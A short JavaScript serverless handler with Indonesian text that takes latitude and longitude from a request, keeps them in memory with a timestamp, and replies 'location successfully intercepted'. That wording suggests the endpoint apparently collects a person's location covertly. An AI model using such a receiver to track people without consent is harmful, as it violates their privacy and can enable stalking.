// Menyimpan lokasi sementara di memori (Serverless)
global.lokasiTerakhir = global.lokasiTerakhir || { lat: null, lon: null, waktu: null };

export default function handler(req, res) {
    const { lat, lon } = req.query;

    if (lat && lon) {
        global.lokasiTerakhir = {
            lat: parseFloat(lat),
            lon: parseFloat(lon),
            waktu: new Date().toLocaleTimeString('id-ID')
        };
        res.status(200).json({ pesan: "Lokasi berhasil disadap!", data: global.lokasiTerakhir });
    } else {
        res.status(400).json({ error: "Koordinat tidak lengkap" });
    }
}